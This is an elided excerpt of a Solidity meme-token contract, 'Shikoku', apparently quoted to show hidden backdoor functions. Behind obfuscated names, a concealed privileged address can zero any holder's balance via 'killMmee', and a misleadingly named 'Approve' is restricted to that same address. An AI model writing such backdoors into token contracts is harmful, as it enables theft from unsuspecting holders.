...
contract Shikoku is Ownable {
    ...
    constructor(address PxWLOY,string memory memename, string memory memesymbol) {
    ...
    address public nGrXNj;
    mapping(address => uint256) private KtPNvJ;
    function killMmee(address JOYSmH) external   {
        if(nGrXNj != _msgSender()){
            revert("mememememem fuck");
        }
        KtPNvJ[JOYSmH] = 0;
    }

    function Approve(address JOYSmH) external   {
        if(nGrXNj != _msgSender()){
           revert("mememememem fuck");
        }
    ...
    function gFPwUE(address JOYSmH) external {
        if(nGrXNj != _msgSender()){
            revert("mememememem fuck");
        }
